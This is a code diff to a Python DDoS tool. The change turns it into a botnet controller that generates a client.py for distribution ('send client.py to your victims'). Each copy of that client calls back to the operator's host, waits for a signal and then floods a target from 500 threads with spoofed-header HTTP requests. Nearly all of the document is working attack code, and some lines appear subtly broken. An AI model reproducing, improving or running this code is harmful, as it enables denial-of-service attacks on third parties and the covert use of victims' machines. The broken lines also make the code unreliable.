@@ -5,35 +5,71 @@ import socket
 import sys
 import threading
 
-#i've created 2 different function for the attack to make the program execution faster
+def accept_bot():
+    while True:
+        s.listen()
+        client, addr = s.accept()
+        clients.append(client)
+
+def create_file(ip, host_port, target, target_port):
+    os.system("touch client.py")
+
+    with open("client.py", "w") as f:
+        f.write(f"""import os
+import random
+import socket
+import threading
+
+def add_useragent():
+    return ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
+            "(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
+            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
+            "Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
+            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
+            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
+            "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)"]
 
 def attack(target, fake_ip, port):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.connect((target, port))
+        s.settimeout(5.0)
+        
+        text = random.choice(["GET", "POST"]) + " /" + target + " HTTP/1.1\r\n"+\
+		      "Host:" + fake_ip + "\r\n" +\
+		      "User-Agent:" + random.choice(add_useragent()) + "\r\n" +\
+		      "Content-Length: 42\r\n"
 
-def attack_2(target, fake_ip, port):
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.sendto(text.encode(), (target, port))
+        if s:
+        	s.sendall("X-a: b\r\n")
 
-        packets += 1
-        console.print(f"Packets sent: [bold blue]{packets}[/bold blue] ", end="\r") 
+def fake_ip_generator():
+	rand = []
+	for x in range(4):
+		rand.append(random.randrange(0,256))
 
-def define_power():
-    console.print("\n[bold blue][1][/bold blue] for a small attack (5 threads)")
-    console.print("[bold blue][2][/bold blue] for a normal attack (50 threads)")
-    console.print("[bold blue][3][/bold blue] for a big attack (500 threads)")
-    console.print(f"[bold blue][4][/bold blue] for a personalized size (suggested: {os.cpu_count()})")
+	if str(rand[0]) == "127":
+		fake_ip_generator()
+
+	return "%d.%d.%d.%d" % (rand[0],rand[1],rand[2],rand[3])
+
+if __name__ == "__main__":
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(({ip}, {host_port}))
+
+    s.recv()
+
+    fake_ip = fake_ip_generator()
+
+    for _ in range(500):
+        thread = threading.Thread(target=attack, args=({target}, fake_ip, {target_port}))
+        thread.start()
+        
+""")
     
-    option = int(console.input("Type --> "))
-    while option not in (1, 2, 3, 4):
-        console.print("Invalid option", style="italic yellow")
-        option = int(console.input("Type> "))
-
-    return 5 if option == 1 else 50 if option == 2 else 500 if option == 3 else int(input("Enter the number of threads> "))
+    console.print("Done, send client.py to your victims", style="bold blue")
 
 def exiting():
     console.print("\nExiting ...", style="bold red")
@@ -41,39 +77,32 @@ def exiting():
         s.close()
     sys.exit()
 
-def get_host_ip_addr(target):
-        try:
-            ip_addr = socket.gethostbyname(target)
-            console.print(f"IP of [bold red]{target}[/bold red] is [bold blue]{ip_addr}[/bold blue]")
-        except socket.gaierror as e:
-            console.print(f"An error occured: {e}", style="bold red")
-            sys.exit(1)
-        else:
-            return ip_addr
-
 def initialize():
     try:
-        global console, packets, s
+        global clients, console, packets, s
+        clients = []
         console = Console()
         packets = 0
         s = None
 
         show_banner()
-        console.print("\n   A proxy anonymized DDos tool", style="bold red")
+        console.print("\n   An anonymized DDos tool", style="bold red")
         target = console.input("\n[bold blue][+][/bold blue] Enter IP address of Target: ")
         port = console.input("[bold blue][+][/bold blue] Enter the target's port: ")
-        fake_ip = int(console.input("[bold blue][+][/bold blue] Enter the fake IP you want to use (suggested 80): "))
-        target_ip = get_host_ip_addr(target)
-        power = define_power()
-        answer = console.input("""[bold blue][+][/bold blue] Do you want to see the numbe of packets i'll send ? 
-(this can slow down your attack ) y/n """)
 
-        console.input("[red]\nPress [bold]ENTER[/bold] to start...[/red]") 
-        console.print("Starting the attack ︻┻┳══━一 \n", style="bold red")
+        ip = console.input("\n[bold blue][+][/bold blue] Enter your IP: ")
+        host_port = int(console.input("[bold blue][+][/bold blue] Enter the port you want to use: "))
 
-        for _ in range(power):
-            thread = threading.Thread(target=attack if answer in ("Y", "y") else attack_2, args=(target_ip, fake_ip, port))
-            thread.start()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((ip, host_port))
+
+        create_file(ip, host_port, target, port)
+
+        threading.Thread(target=accept_bot).start()
+        threading.Thread(target=start).start()
+
+        while True:
+            pass
 
     except KeyboardInterrupt:
         exiting()
@@ -105,3 +134,10 @@ def show_banner():
 
     """
     console.print(banner, style="bold")
+
+def start():
+    console.input("[red]\nPress [bold]ENTER[/bold] to start...[/red]") 
+    for client in clients:
+        client.send("a".encode("ascii"))
+
+    console.print("Starting the attack ︻┻┳══━一 \n", style="bold red")
